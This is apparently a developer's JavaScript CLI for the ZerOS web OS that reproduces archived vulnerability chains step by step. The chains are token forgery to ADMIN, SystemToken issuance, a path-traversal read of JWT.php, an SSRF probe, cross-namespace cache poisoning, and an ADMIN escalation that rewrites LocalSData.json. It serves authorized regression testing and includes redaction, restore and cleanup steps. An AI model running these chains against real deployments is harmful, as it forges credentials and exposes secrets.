/* ZerOS 安全复现工具（单文件 CLI）
 * 用途：在授权测试环境中分步复现已归档漏洞链，便于观察请求与响应形态。
 * 用法：在终端执行 vulnrepro，例如：
 *   vulnrepro -h
 *   vulnrepro --chain 021
 *   vulnrepro --chain 018 --token <JWT>
 *   vulnrepro --chain 023-cleanup
 * 选项：
 *   --chain <id>     复现链：021 | 017 | 018 | 019 | 020 | 023 | 023-cleanup | all | list
 *   --step-delay <n> 每步之间延迟毫秒（默认 800）
 *   --debug          打印更多诊断信息（JWT 默认脱敏）
 *   --token <jwt>    为 018/020 手动指定 Bearer（否则 018 在单独运行时需要）
 *
 * 注意：
 * - 021 签发 SystemToken 时会按 randomSecurity.php 逻辑清空并重建 BootSecurityToken.json 中已有记录，可能影响当前登录态，请在隔离环境使用。
 * - 019 仅请求公网 https://example.com/ ，避免 SSRF 误扫内网。
 * - 023 仅写入纯文本标记，不注入 HTML；结束后请用 --chain 023-cleanup 删除投毒缓存。
 */

(function(window) {
    'use strict';

    var VulnRepro = {
        pid: null,
        terminal: null,
        _kernelAPI: null,
        _closing: false,

        /** 同一会话内复用 021 得到的 SystemToken，便于连续跑 018 / all */
        _session: {
            systemToken: null,
            userToken: null,
            userUpid: null,
            lastRandomValue: null
        },

        __info__: function() {
            var perms = [];
            if (typeof PermissionManager !== 'undefined') {
                perms.push(PermissionManager.PERMISSION.EVENT_LISTENER);
                if (PermissionManager.PERMISSION.CACHE_READ) {
                    perms.push(PermissionManager.PERMISSION.CACHE_READ);
                }
                if (PermissionManager.PERMISSION.CACHE_WRITE) {
                    perms.push(PermissionManager.PERMISSION.CACHE_WRITE);
                }
            }
            return {
                name: 'VulnRepro',
                type: 'CLI',
                version: '1.0.0',
                description: 'ZerOS 漏洞复现分步工具（开发者自用）',
                author: 'ZerOS Team',
                copyright: '© 2026 ZerOS',
                permissions: perms,
                metadata: {
                    autoStart: false,
                    priority: 0,
                    allowMultipleInstances: true
                }
            };
        },

        __init__: async function(pid, initArgs) {
            initArgs = initArgs || {};
            this.pid = pid;
            this.terminal = initArgs.terminal;
            this._kernelAPI = (initArgs && initArgs.kernelAPI) || null;

            if (!this.terminal) {
                throw new Error('VulnRepro 需要终端环境');
            }

            var args = initArgs.args || [];
            var self = this;

            setTimeout(function() {
                self._run(args).catch(function(err) {
                    self._writeLine('[vulnrepro] 错误: ' + (err && err.message ? err.message : String(err)));
                    setTimeout(function() { self._selfClose(); }, 400);
                });
            }, 0);
        },

        _writeLine: function(s) {
            if (this.terminal && typeof this.terminal.write === 'function') {
                this.terminal.write(String(s) + '\n');
            }
        },

        _sleep: function(ms) {
            return new Promise(function(resolve) { setTimeout(resolve, ms); });
        },

        _parseArgs: function(argv) {
            argv = argv || [];
            var out = {
                chain: null,
                stepDelay: 800,
                debug: false,
                token: null,
                user: null
            };
            for (var i = 0; i < argv.length; i++) {
                var a = String(argv[i] == null ? '' : argv[i]).trim();
                if (!a) {
                    continue;
                }
                // 帮助：-h / --help / -help / help（与其它参数混写时仍以帮助优先，见 _run）
                if (a === '-h' || a === '-H' || a === '/h' || a === '/?' ||
                    a === '--help' || /^--?help$/i.test(a) ||
                    a.toLowerCase() === 'help') {
                    out.help = true;
                } else if (a === '--debug') {
                    out.debug = true;
                } else if (a.indexOf('--chain=') === 0) {
                    out.chain = a.slice('--chain='.length);
                } else if (a === '--chain' && i + 1 < argv.length) {
                    out.chain = argv[++i];
                } else if (a.indexOf('--step-delay=') === 0) {
                    out.stepDelay = parseInt(a.slice('--step-delay='.length), 10) || 800;
                } else if (a === '--step-delay' && i + 1 < argv.length) {
                    out.stepDelay = parseInt(argv[++i], 10) || 800;
                } else if (a.indexOf('--token=') === 0) {
                    out.token = a.slice('--token='.length);
                } else if (a === '--token' && i + 1 < argv.length) {
                    out.token = argv[++i];
                } else if (a.indexOf('--user=') === 0) {
                    out.user = a.slice('--user='.length);
                } else if (a === '--user' && i + 1 < argv.length) {
                    out.user = argv[++i];
                }
            }
            return out;
        },

        _serviceOrigin: function() {
            if (typeof SystemInformation !== 'undefined' && SystemInformation.getOrigin) {
                return SystemInformation.getOrigin().replace(/\/+$/, '');
            }
            if (typeof window !== 'undefined' && window.location && window.location.origin) {
                return window.location.origin.replace(/\/+$/, '');
            }
            return '';
        },

        _redactJwt: function(jwt) {
            if (!jwt || typeof jwt !== 'string') {
                return '(empty)';
            }
            if (jwt.length <= 20) {
                return jwt.slice(0, 6) + '…';
            }
            return jwt.slice(0, 12) + '…(' + jwt.length + ' chars)…' + jwt.slice(-8);
        },

        _debug: function(opts, title, obj) {
            if (!opts || !opts.debug) {
                return;
            }
            try {
                var s = typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2);
                if (s.length > 1200) {
                    s = s.slice(0, 1200) + '\n…(truncated)';
                }
                this._writeLine('[debug] ' + title + '\n' + s);
            } catch (e) {
                this._writeLine('[debug] ' + title + ' (stringify failed)');
            }
        },

        _step: async function(opts, title, fn) {
            this._writeLine('\n--- ' + title + ' ---');
            await fn();
            await this._sleep(opts.stepDelay > 0 ? opts.stepDelay : 0);
        },

        _fetchJson: async function(url, init, opts) {
            this._writeLine('[http] ' + (init && init.method ? init.method : 'GET') + ' ' + url);
            var res = await fetch(url, init || {});
            var text = await res.text();
            var parsed = null;
            try {
                parsed = text ? JSON.parse(text) : null;
            } catch (e) {
                parsed = { _raw: text.slice(0, 500) };
            }
            this._debug(opts, 'HTTP ' + res.status, { status: res.status, body: parsed });
            return { ok: res.ok, status: res.status, json: parsed, text: text };
        },

        _genRandomValue32Hex: function() {
            var arr = new Uint8Array(16);
            if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
                crypto.getRandomValues(arr);
            } else {
                for (var i = 0; i < 16; i++) {
                    arr[i] = Math.floor(Math.random() * 256);
                }
            }
            var hex = '';
            for (var j = 0; j < 16; j++) {
                hex += (arr[j] < 16 ? '0' : '') + arr[j].toString(16);
            }
            return hex.toLowerCase();
        },

        _getCurrentUsername: function() {
            if (typeof UserControl !== 'undefined' && typeof UserControl.getCurrentUser === 'function') {
                try {
                    return UserControl.getCurrentUser();
                } catch (e) { /* ignore */ }
            }
            return null;
        },

        _authHeaders: function(token) {
            return {
                'Authorization': 'Bearer ' + token,
                'Content-Type': 'application/json'
            };
        },

        _registerProgramPermissions: async function(opts, userToken, permissions) {
            var origin = this._serviceOrigin();
            var u = new URL(origin + '/system/service/programPermissions.php');
            // programPermissions.php 的 requireJWTVerify() 仍要求 UserToken 请求携带 upid。
            u.searchParams.set('upid', String(this.pid || 1));
            var r = await this._fetchJson(u.toString(), {
                method: 'POST',
                headers: this._authHeaders(userToken),
                body: JSON.stringify({
                    action: 'register',
                    programName: 'vulnrepro',
                    permissions: permissions
                })
            }, opts);
            if (!r.ok || !r.json || r.json.status !== 'success' || !r.json.data || !r.json.data.upid) {
                throw new Error('programPermissions.register 失败');
            }
            this._session.userUpid = r.json.data.upid;
            this._writeLine('已注册后端 upid: ' + this._session.userUpid);
            return this._session.userUpid;
        },

        _fsReadFile: async function(opts, token, path, fileName, upid) {
            var origin = this._serviceOrigin();
            var u = new URL(origin + '/system/service/FSDirve.php');
            u.searchParams.set('action', 'read_file');
            u.searchParams.set('path', path);
            u.searchParams.set('fileName', fileName);
            if (upid) {
                u.searchParams.set('upid', String(upid));
            }
            return await this._fetchJson(u.toString(), {
                method: 'GET',
                headers: this._authHeaders(token)
            }, opts);
        },

        _fsWriteFile: async function(opts, token, path, fileName, content, upid) {
            var origin = this._serviceOrigin();
            var u = new URL(origin + '/system/service/FSDirve.php');
            u.searchParams.set('action', 'write_file');
            u.searchParams.set('path', path);
            u.searchParams.set('fileName', fileName);
            u.searchParams.set('writeMod', 'overwrite');
            if (upid) {
                u.searchParams.set('upid', String(upid));
            }
            return await this._fetchJson(u.toString(), {
                method: 'POST',
                headers: this._authHeaders(token),
                body: JSON.stringify({ content: content })
            }, opts);
        },

        _refreshRuntimeUsers: async function(storageData, username) {
            if (typeof LStorage !== 'undefined') {
                LStorage._storageData = storageData;
                if (LStorage._requestCache) {
                    LStorage._requestCache.readCache = storageData;
                    LStorage._requestCache.timestamp = Date.now();
                }
            }
            if (typeof UserControl !== 'undefined' && typeof UserControl._loadUsers === 'function') {
                await UserControl._loadUsers();
                if (username && typeof UserControl.login === 'function') {
                    // 当前测试镜像的 TestUser 无密码；若目标用户有密码，这步失败也不影响持久化文件已修改。
                    try {
                        await UserControl.login(username, null);
                    } catch (e) { /* ignore */ }
                }
            }
        },

        _showUsage: function() {
            this._writeLine('ZerOS vulnrepro — 漏洞复现分步工具');
            this._writeLine('用法: vulnrepro -h | --help');
            this._writeLine('      vulnrepro --chain <id> [--step-delay <ms>] [--debug] [--token <jwt>]');
            this._writeLine('');
            this._writeLine('--chain 取值:');
            this._writeLine('  list        列出可用链');
            this._writeLine('  021         CVS-ZEROS-021: commit_for_system + SystemToken（破坏性见屏上警告）');
            this._writeLine('  017         CVS-ZEROS-017: 伪造高权限 UserToken');
            this._writeLine('  018         CVS-ZEROS-018: FSDirve read_file 文件名穿越读 JWT.php（无 token 时自动走 017+upid）');
            this._writeLine('  019         CVS-ZEROS-019: video-proxy 请求公网 example.com（探测性）');
            this._writeLine('  020         CVS-ZEROS-020: networkDirve list（无 token 时自动走 017）');
            this._writeLine('  023         CVS-ZEROS-023: 向 exploit 命名空间写入 system.dailyQuote 纯文本标记');
            this._writeLine('  023-cleanup 删除 023 写入的缓存（programName=exploit）');
            this._writeLine('  admin       组合链: 021→备份 LocalSData→将当前用户/--user 提升为 ADMIN');
            this._writeLine('  admin-restore 组合链: 021→从 D:/cache/temp/vulnrepro_LocalSData_backup.json 还原 LocalSData');
            this._writeLine('  all         顺序执行 021→018→017→020→019→023（021 有破坏性，慎用）');
        },

        _chainList: function() {
            this._writeLine('可用链: 021, 017, 018, 019, 020, 023, 023-cleanup, admin, admin-restore, all');
        },

        _run: async function(args) {
            var opts = this._parseArgs(args);
            // 只要出现帮助意图，或无任何有效参数，即显示用法（含仅输入 -h）
            if (opts.help || args.length === 0) {
                this._showUsage();
                await this._selfClose();
                return;
            }
            if (!opts.chain || opts.chain === 'list') {
                this._chainList();
                await this._selfClose();
                return;
            }

            var chain = String(opts.chain).toLowerCase();
            this._writeLine('[vulnrepro] chain=' + chain + ' stepDelay=' + opts.stepDelay + 'ms debug=' + opts.debug);
            this._writeLine('[vulnrepro] origin=' + this._serviceOrigin());

            if (opts.token) {
                this._session.systemToken = opts.token;
            }

            try {
                if (chain === '021') {
                    await this._chain021(opts);
                } else if (chain === '017') {
                    await this._chain017(opts);
                } else if (chain === '018') {
                    await this._chain018(opts);
                } else if (chain === '019') {
                    await this._chain019(opts);
                } else if (chain === '020') {
                    await this._chain020(opts);
                } else if (chain === '023') {
                    await this._chain023(opts);
                } else if (chain === '023-cleanup' || chain === '023_cleanup') {
                    await this._chain023Cleanup(opts);
                } else if (chain === 'admin' || chain === 'user-admin' || chain === 'user_admin') {
                    await this._chainAdmin(opts);
                } else if (chain === 'admin-restore' || chain === 'admin_restore') {
                    await this._chainAdminRestore(opts);
                } else if (chain === 'all') {
                    await this._chainAll(opts);
                } else {
                    this._writeLine('未知 --chain: ' + chain);
                    this._chainList();
                }
            } finally {
                await this._sleep(200);
                await this._selfClose();
            }
        },

        _chain021: async function(opts) {
            var self = this;
            self._writeLine('!!! 警告: 成功签发 SystemToken 时，randomSecurity.php 会清空并重建 BootSecurityToken.json 中已有 JWT 记录（见源码 SystemToken 分支）。仅在隔离环境使用。');

            var origin = self._serviceOrigin();
            var url = origin + '/system/service/randomSecurity.php';
            var rv = self._genRandomValue32Hex();
            self._session.lastRandomValue = rv;
            self._writeLine('[021] randomValue=' + rv);

            await self._step(opts, '021-a commit_for_system', async function() {
                var body = JSON.stringify({ action: 'commit_for_system', randomValue: rv });
                var r = await self._fetchJson(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: body
                }, opts);
                self._writeLine('响应 status=' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success') {
                    throw new Error('commit_for_system 失败');
                }
            });

            await self._step(opts, '021-b 签发 SystemToken', async function() {
                var body = JSON.stringify({ randomValue: rv, type: 'SystemToken' });
                var r = await self._fetchJson(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: body
                }, opts);
                self._writeLine('响应 status=' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success' || !r.json.data || !r.json.data.token) {
                    throw new Error('SystemToken 签发失败');
                }
                var tok = r.json.data.token;
                self._session.systemToken = tok;
                self._writeLine('已获得 SystemToken（脱敏）: ' + self._redactJwt(tok));
                if (opts.debug) {
                    self._writeLine('完整 token 仅在 --debug 下也不打印，请从响应 JSON 自行复制（避免日志泄露）');
                }
            });
        },

        _chain017: async function(opts) {
            var self = this;
            var origin = self._serviceOrigin();
            var url = origin + '/system/service/randomSecurity.php';
            var rv = self._genRandomValue32Hex();
            self._writeLine('[017] randomValue=' + rv);

            await self._step(opts, '017-a 伪造 UserToken（ADMIN + 高权限授权列表）', async function() {
                var perms = [
                    'KERNEL_DISK_READ',
                    'KERNEL_DISK_LIST',
                    'KERNEL_DISK_WRITE',
                    'KERNEL_DISK_DELETE',
                    'KERNEL_DISK_CREATE',
                    'PROCESS_MANAGE',
                    'CACHE_READ',
                    'CACHE_WRITE'
                ];
                var body = JSON.stringify({
                    randomValue: rv,
                    type: 'UserToken',
                    userLevel: 'ADMIN',
                    permissions: perms
                });
                var r = await self._fetchJson(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: body
                }, opts);
                self._writeLine('响应 status=' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success' || !r.json.data || !r.json.data.token) {
                    throw new Error('UserToken 签发失败');
                }
                var tok = r.json.data.token;
                self._session.userToken = tok;
                self._writeLine('已获得 UserToken（脱敏）: ' + self._redactJwt(tok));
                self._session.userPermissions = perms;
            });

            await self._step(opts, '017-b 注册 programPermissionsMap 获取 upid', async function() {
                await self._registerProgramPermissions(opts, self._session.userToken, self._session.userPermissions);
                self._writeLine('017 组合链可用：UserToken + upid=' + self._session.userUpid);
            });
        },

        _chain018: async function(opts) {
            var self = this;
            var tok = self._session.systemToken || null;
            var upid = null;
            if (!tok) {
                if (opts.token) {
                    tok = opts.token;
                } else {
                    self._writeLine('018 未发现 SystemToken，自动走 017 伪造 UserToken 并注册 upid。');
                    await self._chain017(opts);
                    tok = self._session.userToken;
                    upid = self._session.userUpid;
                }
            }

            await self._step(opts, '018 read_file 路径穿越（只读 JWT.php 片段）', async function() {
                var r = await self._fsReadFile(opts, tok, 'D:/cache', '../../../JWT.php', upid);
                self._writeLine('HTTP ' + r.status);
                if (r.json && r.json.data && r.json.data.content !== undefined) {
                    var c = String(r.json.data.content);
                    self._writeLine('读取内容长度: ' + c.length);
                    var preview = c.slice(0, 240).replace(/\s+/g, ' ');
                    self._writeLine('内容预览(前240字符): ' + preview + (c.length > 240 ? '…' : ''));
                } else {
                    self._writeLine('未拿到 content，可能已修复或 token 无效。message=' + (r.json && r.json.message ? r.json.message : ''));
                }
            });
        },

        _chain019: async function(opts) {
            var self = this;
            var target = 'https://example.com/';
            var origin = self._serviceOrigin();
            var u = new URL(origin + '/system/service/video-proxy.php');
            u.searchParams.set('url', target);

            await self._step(opts, '019 video-proxy 公网请求', async function() {
                var r = await fetch(u.toString(), { method: 'GET' });
                var buf = await r.arrayBuffer();
                self._writeLine('HTTP ' + r.status + ' bodyBytes=' + buf.byteLength);
                self._debug(opts, '019 headers', { type: r.headers.get('content-type') });
            });
        },

        _chain020: async function(opts) {
            var self = this;
            var tok = self._session.userToken || opts.token;
            if (!tok) {
                self._writeLine('020 未发现 UserToken，自动先执行 017。');
                await self._chain017(opts);
                tok = self._session.userToken;
            }
            var origin = self._serviceOrigin();
            var u = new URL(origin + '/system/service/networkDirve.php');
            u.searchParams.set('action', 'list');
            u.searchParams.set('upid', String(self._session.userUpid || self.pid || 1));

            await self._step(opts, '020 networkDirve list（带 UserToken + upid）', async function() {
                var r = await self._fetchJson(u.toString(), {
                    method: 'GET',
                    headers: {
                        'Authorization': 'Bearer ' + tok,
                        'Content-Type': 'application/json'
                    }
                }, opts);
                self._writeLine('HTTP ' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (r.json && r.json.data) {
                    self._writeLine('data keys: ' + (typeof r.json.data === 'object' ? Object.keys(r.json.data).join(',') : typeof r.json.data));
                }
            });
        },

        _chain023: async function(opts) {
            var self = this;
            if (!self._kernelAPI || typeof self._kernelAPI.call !== 'function') {
                self._writeLine('023 需要 initArgs.kernelAPI（终端启动的程序）。当前不可用。');
                return;
            }
            var marker = '[ZerOS vulnrepro 023 marker ' + String(Date.now()) + ']';

            await self._step(opts, '023-a Cache.set 跨 programName=exploit 写 system.dailyQuote', async function() {
                await self._kernelAPI.call('Cache.set', [
                    'system.dailyQuote',
                    marker,
                    { ttl: 0, programName: 'exploit' }
                ]);
                self._writeLine('已写入标记（纯文本，无 HTML）');
            });

            await self._step(opts, '023-b 以 EXPLOIT_PID 读 Cache.get（模拟锁屏读法）', async function() {
                if (typeof ProcessManager === 'undefined') {
                    self._writeLine('ProcessManager 不可用，跳过对比读');
                    return;
                }
                var exp = ProcessManager.EXPLOIT_PID || 10000;
                var got = await ProcessManager.callKernelAPI(exp, 'Cache.get', ['system.dailyQuote', null, {}]);
                self._writeLine('EXPLOIT_PID Cache.get 返回值类型: ' + typeof got);
                if (got === marker) {
                    self._writeLine('结果: 与投毒内容一致 → 跨命名空间缓存投毒成立（见 CVS-ZEROS-023）');
                } else {
                    self._writeLine('结果: 未读到标记（可能已修复或缓存键不一致）。值预览: ' + String(got).slice(0, 120));
                }
            });

            self._writeLine('提示: 复现后请执行 vulnrepro --chain 023-cleanup 清理');
        },

        _chain023Cleanup: async function(opts) {
            var self = this;
            if (!self._kernelAPI || typeof self._kernelAPI.call !== 'function') {
                self._writeLine('023-cleanup 需要 kernelAPI');
                return;
            }
            await self._step(opts, '023-cleanup Cache.delete', async function() {
                var ok = await self._kernelAPI.call('Cache.delete', ['system.dailyQuote', { programName: 'exploit' }]);
                self._writeLine('Cache.delete 返回: ' + JSON.stringify(ok));
            });
        },

        _chainAdmin: async function(opts) {
            var self = this;
            var targetUser = opts.user || self._getCurrentUsername() || 'TestUser';
            self._writeLine('=== admin: 将用户 ' + targetUser + ' 提升为 ADMIN（会备份 LocalSData.json）===');
            self._writeLine('说明: 这条链使用 021 获得 SystemToken，再通过 FSDirve 覆盖 LocalSData.json；不使用 server-*.js。');

            if (!self._session.systemToken && !opts.token) {
                await self._chain021(opts);
            } else if (opts.token) {
                self._session.systemToken = opts.token;
            }
            var tok = self._session.systemToken;

            var storageData = null;
            var originalContent = null;
            await self._step(opts, 'admin-a 读取 D:/LocalSData.json', async function() {
                var r = await self._fsReadFile(opts, tok, 'D:', 'LocalSData.json', null);
                if (!r.ok || !r.json || !r.json.data || r.json.data.content === undefined) {
                    throw new Error('读取 LocalSData.json 失败');
                }
                originalContent = String(r.json.data.content);
                storageData = JSON.parse(originalContent);
                var users = storageData.system && storageData.system['userControl.users'];
                var before = users && users[targetUser] ? users[targetUser].level : '(missing)';
                self._writeLine('当前持久化级别: ' + targetUser + ' = ' + before);
            });

            await self._step(opts, 'admin-b 写入备份 D:/cache/temp/vulnrepro_LocalSData_backup.json', async function() {
                var r = await self._fsWriteFile(opts, tok, 'D:/cache/temp', 'vulnrepro_LocalSData_backup.json', originalContent, null);
                self._writeLine('备份写入 HTTP ' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success') {
                    throw new Error('备份写入失败');
                }
            });

            await self._step(opts, 'admin-c 修改 userControl.users.' + targetUser + '.level = ADMIN', async function() {
                if (!storageData.system) {
                    storageData.system = {};
                }
                if (!storageData.system['userControl.users']) {
                    throw new Error('LocalSData 缺少 userControl.users');
                }
                if (!storageData.system['userControl.users'][targetUser]) {
                    throw new Error('目标用户不存在: ' + targetUser);
                }
                storageData.system['userControl.users'][targetUser].level = 'ADMIN';
                storageData.system['userControl.currentUser'] = targetUser;
                var modified = JSON.stringify(storageData, null, 2);
                var r = await self._fsWriteFile(opts, tok, 'D:', 'LocalSData.json', modified, null);
                self._writeLine('LocalSData 写入 HTTP ' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success') {
                    throw new Error('LocalSData 写入失败');
                }
            });

            await self._step(opts, 'admin-d 刷新运行态 UserControl/LStorage 并验证', async function() {
                await self._refreshRuntimeUsers(storageData, targetUser);
                var runtimeUser = self._getCurrentUsername();
                var runtimeLevel = '(unknown)';
                var isAdmin = false;
                if (typeof UserControl !== 'undefined') {
                    runtimeLevel = typeof UserControl.getCurrentUserLevel === 'function' ? UserControl.getCurrentUserLevel() : '(no api)';
                    isAdmin = typeof UserControl.isAdmin === 'function' ? UserControl.isAdmin() : false;
                }
                self._writeLine('运行态当前用户: ' + runtimeUser);
                self._writeLine('运行态级别: ' + runtimeLevel + ' isAdmin=' + isAdmin);
                self._writeLine('还原命令: vulnrepro --chain admin-restore');
            });
        },

        _chainAdminRestore: async function(opts) {
            var self = this;
            self._writeLine('=== admin-restore: 从 D:/cache/temp/vulnrepro_LocalSData_backup.json 还原 LocalSData.json ===');
            if (!self._session.systemToken && !opts.token) {
                await self._chain021(opts);
            } else if (opts.token) {
                self._session.systemToken = opts.token;
            }
            var tok = self._session.systemToken;
            var backupContent = null;
            var parsed = null;

            await self._step(opts, 'restore-a 读取备份', async function() {
                var r = await self._fsReadFile(opts, tok, 'D:/cache/temp', 'vulnrepro_LocalSData_backup.json', null);
                if (!r.ok || !r.json || !r.json.data || r.json.data.content === undefined) {
                    throw new Error('没有找到备份文件，无法自动还原');
                }
                backupContent = String(r.json.data.content);
                parsed = JSON.parse(backupContent);
                self._writeLine('备份读取成功，长度=' + backupContent.length);
            });

            await self._step(opts, 'restore-b 写回 D:/LocalSData.json', async function() {
                var r = await self._fsWriteFile(opts, tok, 'D:', 'LocalSData.json', backupContent, null);
                self._writeLine('还原写入 HTTP ' + r.status + ' message=' + (r.json && r.json.message ? r.json.message : ''));
                if (!r.ok || !r.json || r.json.status !== 'success') {
                    throw new Error('LocalSData 还原失败');
                }
            });

            await self._step(opts, 'restore-c 刷新运行态', async function() {
                await self._refreshRuntimeUsers(parsed, parsed.system ? parsed.system['userControl.currentUser'] : null);
                var runtimeLevel = '(unknown)';
                var isAdmin = false;
                if (typeof UserControl !== 'undefined') {
                    runtimeLevel = typeof UserControl.getCurrentUserLevel === 'function' ? UserControl.getCurrentUserLevel() : '(no api)';
                    isAdmin = typeof UserControl.isAdmin === 'function' ? UserControl.isAdmin() : false;
                }
                self._writeLine('还原后运行态用户: ' + self._getCurrentUsername());
                self._writeLine('还原后运行态级别: ' + runtimeLevel + ' isAdmin=' + isAdmin);
            });
        },

        _chainAll: async function(opts) {
            var self = this;
            self._writeLine('=== all: 将顺序执行多条链，021 会破坏 JWT 记录文件，确认环境已隔离 ===');
            await self._sleep(opts.stepDelay);
            await self._chain021(opts);
            await self._chain018(opts);
            await self._chain017(opts);
            await self._chain020(opts);
            await self._chain019(opts);
            await self._chain023(opts);
            self._writeLine('\n=== all 完成。建议: vulnrepro --chain 023-cleanup；若 JWT 状态异常请重新登录或从备份恢复 BootSecurityToken.json ===');
        },

        _selfClose: async function() {
            if (this._closing) {
                return;
            }
            this._closing = true;
            await this._sleep(200);
            if (!this.pid) {
                return;
            }
            var ProcessMgr = typeof ProcessManager !== 'undefined' ? ProcessManager : null;
            if (!ProcessMgr && typeof POOL !== 'undefined' && POOL.__GET__) {
                try {
                    ProcessMgr = POOL.__GET__('KERNEL_GLOBAL_POOL', 'ProcessManager');
                } catch (e) { /* ignore */ }
            }
            try {
                if (this._kernelAPI && typeof this._kernelAPI.call === 'function') {
                    await this._kernelAPI.call('Process.requestSelfTermination', []);
                } else if (ProcessMgr && typeof ProcessMgr.callKernelAPI === 'function') {
                    await ProcessMgr.callKernelAPI(this.pid, 'Process.requestSelfTermination', []);
                } else if (ProcessMgr && typeof ProcessMgr.killProgram === 'function') {
                    await ProcessMgr.killProgram(this.pid, true);
                }
            } catch (err) {
                if (ProcessMgr && typeof ProcessMgr.killProgram === 'function') {
                    try {
                        await ProcessMgr.killProgram(this.pid, true);
                    } catch (e2) { /* ignore */ }
                }
            }
        },

        __exit__: async function() {
            this.terminal = null;
        }
    };

    if (typeof window !== 'undefined') {
        // ProcessManager 按命令名大写查找程序对象：vulnrepro -> VULNREPRO。
        window.VULNREPRO = VulnRepro;
        window.VulnRepro = VulnRepro;
    }

    if (typeof POOL !== 'undefined' && POOL.__ADD__) {
        try {
            if (!POOL.__HAS__('APPLICATION_SHARED_POOL')) {
                POOL.__INIT__('APPLICATION_SHARED_POOL');
            }
            POOL.__ADD__('APPLICATION_SHARED_POOL', 'VULNREPRO', VulnRepro);
            POOL.__ADD__('APPLICATION_SHARED_POOL', 'VulnRepro', VulnRepro);
        } catch (e) { /* ignore */ }
    }
})(window);
